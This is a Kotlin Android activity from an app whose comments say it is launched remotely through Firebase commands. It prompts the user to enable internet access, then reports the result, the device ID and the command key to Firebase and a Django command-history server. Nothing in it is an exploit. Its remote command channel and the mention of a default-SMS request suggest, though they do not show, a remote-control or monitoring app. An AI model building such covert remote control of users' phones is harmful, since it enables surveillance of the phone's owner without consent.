package com.example.fast.ui

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.provider.Settings
import android.view.ViewGroup
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.lifecycle.lifecycleScope
import com.example.fast.config.AppConfig
import com.example.fast.R
import com.example.fast.ui.card.MultipurposeCardController
import com.example.fast.ui.card.MultipurposeCardSpec
import com.example.fast.ui.card.BirthSpec
import com.example.fast.ui.card.FillUpSpec
import com.example.fast.ui.card.PurposeSpec
import com.example.fast.ui.card.DeathSpec
import com.example.fast.ui.card.EntranceAnimation
import com.example.fast.ui.card.CardSize
import com.example.fast.util.NetworkUtils
import com.example.fast.util.DjangoApiHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.launch

/**
 * InternetCheckActivity
 *
 * Activity launched remotely via Firebase command to prompt user to enable internet.
 * Uses MultipurposeCard for consistent UI with rest of app.
 * Opens Android's Internet Panel (Android 10+) or WiFi settings.
 *
 * Usage:
 * - Command: checkInternet or requestInternet
 * - Content: Any value (ignored)
 *
 * Similar approach to DefaultSmsRequestActivity but for network connectivity.
 */
class InternetCheckActivity : AppCompatActivity() {

    private val TAG = "InternetCheckActivity"
    private val handler = Handler(Looper.getMainLooper())
    private val noActionTimeoutMs = 60_000L
    private var noActionRunnable: Runnable? = null
    private val prefsName = "internet_check_prefs"
    private val KEY_LAST_STATUS = "last_internet_status"
    private val KEY_LAST_REASON = "last_internet_reason"
    private val KEY_LAST_UPDATED_AT = "last_internet_updated_at"
    private val commandKey by lazy { intent.getStringExtra("commandKey") }
    private val commandHistoryTimestamp by lazy { intent.getLongExtra("historyTimestamp", -1L) }
    private var hasOpenedSettings = false
    private var hasUpdatedCommandHistory = false
    private var hasSyncedStatus = false
    private var cardController: MultipurposeCardController? = null

    private lateinit var rootView: ViewGroup

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Set window background to match app theme
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
        }

        // Simple root layout for multipurpose card overlay
        rootView = android.widget.FrameLayout(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(resources.getColor(R.color.theme_gradient_start, theme))
        }
        setContentView(rootView)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)

        // Check current internet status
        if (NetworkUtils.hasInternetConnection(this)) {
            Log.d(TAG, "Internet is already connected")
            showAlreadyConnectedCard()
        } else {
            showConnectInternetCard()
        }
    }

    /**
     * Show card when internet is already connected
     */
    private fun showAlreadyConnectedCard() {
        val networkType = NetworkUtils.getNetworkType(this)
        
        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 150,
                    cardScaleMs = 400,
                    fromScale = 0.9f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "CONNECTED",
                body = "Internet connection is active.\n\n" +
                       "Network type: $networkType\n\n" +
                       "All services are working normally.",
                typingAnimation = true,
                perCharDelayMs = 25
            ),
            purpose = PurposeSpec.Dismiss(
                primaryButtonLabel = "Continue",
                onPrimary = {
                    storeAndSyncStatus(true, "already_connected")
                    finish()
                }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { finish() },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Show card to prompt user to connect to internet
     */
    private fun showConnectInternetCard() {
        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 150,
                    cardScaleMs = 400,
                    fromScale = 0.9f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "NO INTERNET",
                body = "Internet connection is required.\n\n" +
                       "Please enable WiFi or Mobile Data:\n" +
                       "• Turn on WiFi and connect to a network\n" +
                       "• Or enable Mobile Data\n\n" +
                       "Tap below to open settings.",
                typingAnimation = true,
                perCharDelayMs = 20
            ),
            purpose = PurposeSpec.Dual(
                primaryButtonLabel = "OPEN SETTINGS",
                secondaryButtonLabel = "Cancel",
                onPrimary = {
                    hasOpenedSettings = true
                    openInternetSettings()
                    startNoActionTimeout()
                },
                onSecondary = {
                    storeAndSyncStatus(false, "user_cancelled")
                    updateCommandHistoryStatus("failed", "user_cancelled")
                    finish()
                }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { /* Card dismissed */ },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Show success card after user enables internet
     */
    private fun showSuccessCard() {
        // Dismiss current card first
        cardController?.dismiss()

        val networkType = NetworkUtils.getNetworkType(this)

        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 100,
                    cardScaleMs = 300,
                    fromScale = 0.95f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "CONNECTED",
                body = "Internet connection established!\n\n" +
                       "Network type: $networkType\n\n" +
                       "All services are now available.",
                typingAnimation = true,
                perCharDelayMs = 25
            ),
            purpose = PurposeSpec.Dismiss(
                primaryButtonLabel = "Continue",
                onPrimary = { finish() }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { finish() },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Show card when user returned but still no internet
     */
    private fun showStillNoInternetCard() {
        // Dismiss current card first
        cardController?.dismiss()

        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 100,
                    cardScaleMs = 300,
                    fromScale = 0.95f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "STILL OFFLINE",
                body = "Internet connection not detected.\n\n" +
                       "Please check:\n" +
                       "• WiFi is connected to a network\n" +
                       "• Mobile Data is enabled\n" +
                       "• Airplane mode is OFF",
                typingAnimation = true,
                perCharDelayMs = 20
            ),
            purpose = PurposeSpec.Dual(
                primaryButtonLabel = "TRY AGAIN",
                secondaryButtonLabel = "Cancel",
                onPrimary = {
                    openInternetSettings()
                    startNoActionTimeout()
                },
                onSecondary = {
                    storeAndSyncStatus(false, "user_gave_up")
                    updateCommandHistoryStatus("failed", "user_gave_up")
                    finish()
                }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { /* Card dismissed */ },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Open internet settings panel
     */
    private fun openInternetSettings() {
        try {
            Log.d(TAG, "Opening internet settings")
            NetworkUtils.openInternetSettings(this)
            Log.d(TAG, "Internet settings opened successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error opening internet settings", e)
            updateCommandHistoryStatus("failed", "settings_launch_error: ${e.message}")
            finish()
        }
    }

    override fun onResume() {
        super.onResume()

        // Check if user has enabled internet after returning from settings
        if (hasOpenedSettings) {
            clearNoActionTimeout()
            
            if (NetworkUtils.hasInternetConnection(this)) {
                Log.d(TAG, "Internet is now connected")
                storeAndSyncStatus(true, "user_enabled_internet")
                updateCommandHistoryStatus("executed", "user_enabled_internet")
                showSuccessCard()
            } else {
                Log.d(TAG, "Still no internet connection")
                showStillNoInternetCard()
            }
        }
    }

    private fun startNoActionTimeout() {
        clearNoActionTimeout()
        noActionRunnable = Runnable {
            if (!hasSyncedStatus && hasOpenedSettings) {
                storeAndSyncStatus(false, "no_action")
                updateCommandHistoryStatus("failed", "no_action")
                finish()
            }
        }
        handler.postDelayed(noActionRunnable!!, noActionTimeoutMs)
    }

    private fun clearNoActionTimeout() {
        noActionRunnable?.let { handler.removeCallbacks(it) }
        noActionRunnable = null
    }

    private fun storeAndSyncStatus(isConnected: Boolean, reason: String) {
        if (hasSyncedStatus) return
        hasSyncedStatus = true

        val updatedAt = System.currentTimeMillis()
        val networkType = if (isConnected) NetworkUtils.getNetworkType(this) else "NONE"
        
        getSharedPreferences(prefsName, MODE_PRIVATE).edit()
            .putBoolean(KEY_LAST_STATUS, isConnected)
            .putString(KEY_LAST_REASON, reason)
            .putLong(KEY_LAST_UPDATED_AT, updatedAt)
            .apply()

        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val statusPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/systemInfo/internetStatus/$updatedAt"
        val statusData = mapOf(
            "isConnected" to isConnected,
            "networkType" to networkType,
            "reason" to reason,
            "updatedAt" to updatedAt,
            "commandKey" to (commandKey ?: ""),
            "commandTimestamp" to commandHistoryTimestamp
        )

        Firebase.database.reference.child(statusPath).setValue(statusData)
            .addOnSuccessListener {
                Log.d(TAG, "Internet status synced to Firebase: $statusPath")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to sync internet status to Firebase", e)
            }
    }

    @Suppress("DEPRECATION")
    private fun updateCommandHistoryStatus(status: String, reason: String) {
        if (hasUpdatedCommandHistory) return
        val key = commandKey ?: return
        if (commandHistoryTimestamp <= 0L) return

        hasUpdatedCommandHistory = true
        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        lifecycleScope.launch {
            try {
                DjangoApiHelper.logCommand(
                    deviceId = deviceId,
                    command = key,
                    value = null,
                    status = status,
                    receivedAt = commandHistoryTimestamp,
                    executedAt = System.currentTimeMillis(),
                    errorMessage = reason
                )
                Log.d(TAG, "Updated command history: $key -> $status ($reason)")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update command history", e)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        clearNoActionTimeout()
        cardController?.dismiss()
        cardController = null
    }
}
